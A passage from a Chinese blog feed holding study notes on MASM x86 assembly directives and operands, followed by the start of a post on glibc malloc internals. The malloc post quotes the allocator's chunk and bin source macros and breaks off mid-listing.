afternoon&quot;,0<br>#也可以<br>greeting1 BYTE &quot;Welcome to the Encryption Demo program &quot;<br>          BYTE &quot;created by Kip Irvine.&quot;,0dh, 0ah<br>#还可以使用backslash分行<br></code></pre></div></td></tr></table></figure><ul><li>DUP 操作符: 使用一个整数表达式作为计数器，为多个数据项分配存储空间</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"> BYTE 4 DUP ( &quot;STACK&quot; ) ; 20 个字节：<br>#第一个数字是BYTE的个数, 第二个数字由DUP计算得出, 单位是字节    <br>#提供了一种方便的方式来初始化数组:<br>array BYTE 5 DUP (?) ; 5 个数值，未初始化<br></code></pre></div></td></tr></table></figure></li><li><p>WORD and SWORD, DWORD, SDWORD, QWORD, </p></li><li><p>同BYTE和SBYTE</p></li><li><p>剩下还有浮点类型, BCD数据等等, 不看了</p></li></ul><hr><ul><li><p><code>.DATA ?</code>伪指令声明未初始化数据。当定义大量未初始化数据时，.DATA ? 伪指令减少了编译程序的大小。</p></li><li><p>等号=伪指令, 相当于宏定义一个数据, 可多次重复定义</p></li><li><p>当前地址计数器:<strong><code>selfPtr DWORD $</code></strong> </p></li><li><p>让汇编器计算数组长度: </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">list BYTE 10,20,30,40<br>ListSize = ($ - list) # 注意此时计算出来的是地址的差值, 所以单位是字节, 如果遇到WORD要注<br></code></pre></div></td></tr></table></figure></li><li><p>EQU伪指令, 无法多次定义</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">name EQU expression    #必须是整数表达式<br>name EQU symbol        #任意一个用EQU或=定义过的符号<br>name EQU &lt;text&gt;        #直接文本替换, 最像#define, 也可用来定义实数<br></code></pre></div></td></tr></table></figure></li><li><p>TEXTEQU 文本宏伪指令, </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">name TEXTEQU &lt;text&gt;            # 就是文本<br>name TEXTEQU textmacro        # 前面的文本宏<br>name TEXTEQU %constExpr        # 整数表达式<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h3><p>操作数有 3 种基本类型：</p><ul><li>立即数——用数字文本表达式</li><li>寄存器操作数——使用 CPU 内已命名的寄存器</li><li>内存操作数——引用内存位置</li></ul><table><thead><tr><th>操作数</th><th>说明</th></tr></thead><tbody><tr><td>reg8</td><td>8 位通用寄存器：AH、AL、BH、BL、CH、CL、DH、DL</td></tr><tr><td>reg16</td><td>16 位通用寄存器：AX、BX、CX、DX、SI、DI、SP、BP</td></tr><tr><td>reg32</td><td>32 位通用寄存器：EAX、EEX、ECX、EDX、ESI、EDI、ESP、EBP</td></tr><tr><td>reg</td><td>通用寄存器</td></tr><tr><td>sreg</td><td>16 位段寄存器：CS、DS、SS、ES、FS、GS</td></tr><tr><td>imm</td><td>8 位、16 位或 32 位立即数</td></tr><tr><td>imm8</td><td>8 位立即数，字节型数值</td></tr><tr><td>imm16</td><td>16 位立即数，字类型数值</td></tr><tr><td>imm32</td><td>32 位立即数，双字型数值</td></tr><tr><td>reg/mem8</td><td>8 位操作数，可以是 8 位通用寄存器或内存字节</td></tr><tr><td>reg/mem16</td><td>16 位立即数，可以是 16 位通用寄存器或内存字</td></tr><tr><td>reg/mem32</td><td>32 位立即数，可以是 32 位通用寄存器或内存双字</td></tr><tr><td>mem</td><td>8位、16 位或 32 位内存操作数</td></tr></tbody></table><hr><p>4.9 <a href="http://c.biancheng.net/view/3514.html">OFFSET运算符</a> : 表示的是该数据标号距离数据段起始地址的距离</p><p>4.10 <a href="http://c.biancheng.net/view/3515.html">ALIGN伪指令</a> 1,2,4,8,16字节对齐</p><p>4.11 <a href="http://c.biancheng.net/view/3516.html">PTR运算符</a> </p><ul><li><p><code>mov ax,WORD PTR myDouble</code>, 把一个DWORD的低两字节传入ax(因为是小端法存储, 而且可用偏移来传入<br>高两字节:<code>mov ax,WORD PTR [myDouble+2]</code>)</p></li><li><p>把两个小的移入大的: </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">wordList WORD 5678h,1234h<br>mov eax, DWORD PTR wordList<br></code></pre></div></td></tr></table></figure></li></ul><p>4.12 <a href="http://c.biancheng.net/view/3517.html">TYPE运算符</a> 返回变量的大小</p><p>4.13 <a href="http://c.biancheng.net/view/3518.html">LENGTHOF运算符 </a> 计算数组中元素的个数, 如果数组占据多行, 只计算第一行</p><p>4.14 <a href="http://c.biancheng.net/view/3519.html">LABEL伪指令</a> 可以插入一个标号，并定义它的大小属性，但是不为这个标号分配存储空间<br>        <code>LongValue LABEL DWORD</code> 标识下一个地址开始的DWORD字节</p><p>4.15 <a href="http://c.biancheng.net/view/3525.html">间接寻址</a> 特殊: <code>inc BYTE PTR [esi]</code> 要加指针的类型, 剩下的有很多, 详见网站</p><p>4.16 <a href="http://c.biancheng.net/view/3528.html">JMP和LOOP指令</a> 这个loop集成了ECX以及其他一些指令, 要看的话详见网站</p><h2 id="汇编语言过程"><a href="#汇编语言过程" class="headerlink" title="汇编语言过程"></a>汇编语言过程</h2><ul><li><p>压栈出栈, push&amp;pop</p></li><li><p>PUSHFD 和 POPFD 指令: 压入和弹出EFLAGS寄存器</p></li><li><p>PUSHA (push all-16bits), PUSHAD (push all double-32bits),  POPAD 和 POPA</p></li><li><p><strong>PROC和ENDP ：定义一个过程</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">main PROC<br>.<br>.<br>main ENDP<br></code></pre></div></td></tr></table></figure><ul><li>标号只有过程中的有效, 不过也可以定义全局标号<code>Destination::</code>, 使用两个引号即可, 尽量少用</li></ul></li><li><p>USES 运算符: 在PROC 伪指令一行后面指出当前过程要修改的寄存器, 汇编器在头尾自动生成push和pop指令, 只对汇编器有效</p></li><li><p>链接库跳过</p></li></ul><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><table><thead><tr><th>操作</th><th>说明</th></tr></thead><tbody><tr><td>AND</td><td>源操作数和目的操作数进行逻辑与操作</td></tr><tr><td>OR</td><td>源操作数和目的操作数进行逻辑或操作</td></tr><tr><td>XOR</td><td>源操作数和目的操作数进行逻辑异或操作</td></tr><tr><td>NOT</td><td>对目标操作数进行逻辑非操作</td></tr><tr><td>TEST</td><td>源操作数和目的操作数进行逻辑与操作，并适当地设置 CPU 标志位</td></tr></tbody></table><ul><li>置位和清除零标志位、符号标志位、进位标志位和溢出标志位的<a href="http://c.biancheng.net/view/3563.html">方法</a> </li><li>汇编语言64位模式下的布尔指令: <ul><li>32 位操作数是一个特殊的情况，需要与其他大小操作数的情况分开考虑。</li></ul></li><li>条件跳转<ul><li>注意无符号数和有符号数的比较是不同的.</li><li></li></ul></li><li>…</li></ul><h2 id="整数运算"><a href="#整数运算" class="headerlink" title="整数运算"></a>整数运算</h2><ol><li><p><a href="http://c.biancheng.net/view/3589.html">汇编语言移位和循环移位指令简介</a> </p></li><li><p><a href="http://c.biancheng.net/view/3590.html">汇编语言SHL（左移）指令：将操作数逻辑左移一位</a> </p></li><li><p><a href="http://c.biancheng.net/view/3591.html">汇编语言SHR（右移）指令：将操作数逻辑右移一位</a> </p></li><li><p><a href="http://c.biancheng.net/view/3592.html">汇编语言SAL（算术左移）和SAR（算术右移）指令：将操作数左</a> </p></li><li><p><a href="http://c.biancheng.net/view/3593.html">汇编语言ROL（循环左移）指令：将操作数所有位都向左移</a> </p></li><li><p><a href="http://c.biancheng.net/view/3595.html">汇编语言ROR（循环右移）指令：将操作数所有位都向右移</a> </p></li><li><p><a href="http://c.biancheng.net/view/3596.html">汇编语言RCL（带进位循环左移）和RCR（带进位循环右移）指令</a> </p></li><li><p><a href="http://c.biancheng.net/view/3597.html">汇编语言SHLD（双精度左移）和SHRD（双精度右移）指令</a> </p></li><li><p><a href="http://c.biancheng.net/view/3600.html">汇编语言移位和循环移位的应用</a> </p></li><li><p><a href="http://c.biancheng.net/view/3602.html">汇编语言MUL指令：无符号数乘法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3603.html">汇编语言IMUL指令：有符号数乘法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3605.html">汇编语言GetMseconds：测量程序执行时间</a> </p></li><li><p><a href="http://c.biancheng.net/view/3606.html">汇编语言DIV指令：无符号除法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3609.html">汇编语言IDICV指令：有符号数除法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3610.html">使用汇编语言实现算术表达式[实例]</a> </p></li><li><p><a href="http://c.biancheng.net/view/3611.html">汇编语言ADC指令：带进位加法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3612.html">汇编语言SBB指令：带借位减法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3614.html">汇编语言ASCII和非压缩十进制运算</a> </p></li><li><p><a href="http://c.biancheng.net/view/3615.html">汇编语言AAA指令：调整ADD或ADC指令的二进制运算结果 </a> </p></li><li><p><a href="http://c.biancheng.net/view/3616.html">汇编语言AAS指令：减法后的ASXII调整</a> </p></li><li><p><a href="http://c.biancheng.net/view/3617.html">汇编语言AAM（乘法后的ASCII调整）和AAD（除法之前的ASCII调整）指</a> </p></li><li><p><a href="http://c.biancheng.net/view/3619.html">汇编语言压缩十进制运算简介</a> </p></li><li><p><a href="http://c.biancheng.net/view/3621.html">汇编语言DAA指令：加法后的十进制调整</a> </p></li><li><p><a href="http://c.biancheng.net/view/3622.html">汇编语言DAS指令：减法后的十进制调整</a> </p></li></ol><h2 id="汇编语言高级过程"><a href="#汇编语言高级过程" class="headerlink" title="汇编语言高级过程"></a>汇编语言高级过程</h2>]]></content>
    
    
    <categories>
      
      <category>programming_language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>programming_language</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc_malloc(2.27/28) &amp; techniques</title>
    <link href="/2021-08/pwn-glibc-malloc-srcCode/"/>
    <url>/2021-08/pwn-glibc-malloc-srcCode/</url>
    
    <content type="html"><![CDATA[<h1 id="基本数据结构及函数"><a href="#基本数据结构及函数" class="headerlink" title="基本数据结构及函数"></a>基本数据结构及函数</h1><h2 id="管理chunk"><a href="#管理chunk" class="headerlink" title="管理chunk"></a>管理chunk</h2><h3 id="Size-and-alignment-checks-and-conversions"><a href="#Size-and-alignment-checks-and-conversions" class="headerlink" title="Size and alignment checks and conversions"></a>Size and alignment <code>checks</code> and conversions</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* conversion from malloc headers to user pointers, and back */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br><span class="hljs-comment">/* The smallest possible chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br><span class="hljs-comment">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MINSIZE  \</span><br><span class="hljs-meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p) \</span><br><span class="hljs-meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="hljs-meta">   &amp; MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span><br><span class="hljs-meta">  ((unsigned long) (req) &gt;=                                                      \</span><br><span class="hljs-meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> request2size(req)                                         \</span><br><span class="hljs-meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="hljs-meta">   MINSIZE :                                                      \</span><br><span class="hljs-meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/* Same, except also perform an argument and result check.  First, we check</span><br><span class="hljs-comment">   that the padding done by request2size didn&#x27;t result in an integer</span><br><span class="hljs-comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span><br><span class="hljs-comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span><br><span class="hljs-comment">   overflow.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> checked_request2size(req, sz) \</span><br><span class="hljs-meta">(&#123;                                    \</span><br><span class="hljs-meta">  (sz) = request2size (req);            \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (((sz) &lt; (req))                    \</span><br><span class="hljs-meta">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="hljs-meta">    &#123;                                    \</span><br><span class="hljs-meta">      __set_errno (ENOMEM);            \</span><br><span class="hljs-meta">      return 0;                            \</span><br><span class="hljs-meta">    &#125;                                    \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></div></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_chunk">malloc_chunk</a></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*  chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="hljs-comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="hljs-comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             User data starts here...                          .</span><br><span class="hljs-comment">            .                                                               .</span><br><span class="hljs-comment">            .             (malloc_usable_size() bytes)                      .</span><br><span class="hljs-comment">            .                                                               |</span><br><span class="hljs-comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             (size of chunk, but used for application data)    |</span><br><span class="hljs-comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="hljs-comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      mchunk_size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p><strong>MALLOC_ALIGNMENT</strong>被定义为<code>2 * SIZE_SZ</code> 和 <code>__alignof__ (long double)</code>中的较大者, 分别为8和16字节.<br><strong>MALLOC_ALIGN_MASK</strong>定义为MALLOC_ALIGNMENT - 1, 在64位上是0b1111.<br><strong>MIN_CHUNK_SIZE</strong>是fd_nextsize指针之前的部分.<br><strong>MINSIZE</strong> = <code>(unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</code> 即可完成块大小的16位对齐.</p><p>这样, 在64位系统上MINSIZE就是32(0x20)字节.</p><p><strong>tips</strong>: <code># define INTERNAL_SIZE_T size_t</code>  分别为4或8字节</p><h3 id="chunk-operations"><a href="#chunk-operations" class="headerlink" title="chunk operations"></a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#1229">chunk operations</a></h3><p>没啥特别的, 如果有需要的话随时查找即可</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREV_INUSE 0x1</span><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_MMAPPED 0x2</span><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><span class="hljs-comment">/* Check for chunk from main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span><br><span class="hljs-comment">/* Mark a chunk as not being on the main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Bits to mask off when extracting size</span><br><span class="hljs-comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span><br><span class="hljs-comment">   macros for which mmapped chunks should never be seen. This should</span><br><span class="hljs-comment">   cause helpful core dumps to occur if it is tried by accident by</span><br><span class="hljs-comment">   people extending or adapting this malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span><br><span class="hljs-comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="hljs-comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><span class="hljs-comment">/* extract p&#x27;s inuse bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)                                                              \</span><br><span class="hljs-meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* set/clear chunk as being inuse without otherwise disturbing */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br><span class="hljs-comment">/* check/set/clear inuse bits in known places */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br><span class="hljs-comment">/* Set size at head, without disturbing its use bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br></code></pre></div></td></tr></table></figure><h2 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h2><h3 id="在malloc-state中的存储"><a href="#在malloc-state中的存储" class="headerlink" title="在malloc_state中的存储"></a>在malloc_state中的存储</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/* Fastbins */</span><br>mfastbinptr fastbinsY[NFASTBINS];<br><span class="hljs-comment">/* Normal bins packed as described above */</span><br>mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="bin数组定位"><a href="#bin数组定位" class="headerlink" title="bin数组定位"></a>bin数组定位</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist, */</span><span class="hljs-comment">/*Bin 1 is the unordered list*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                              \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))  </span><br><span class="hljs-comment">/* analog of ++bin */</span><br><span 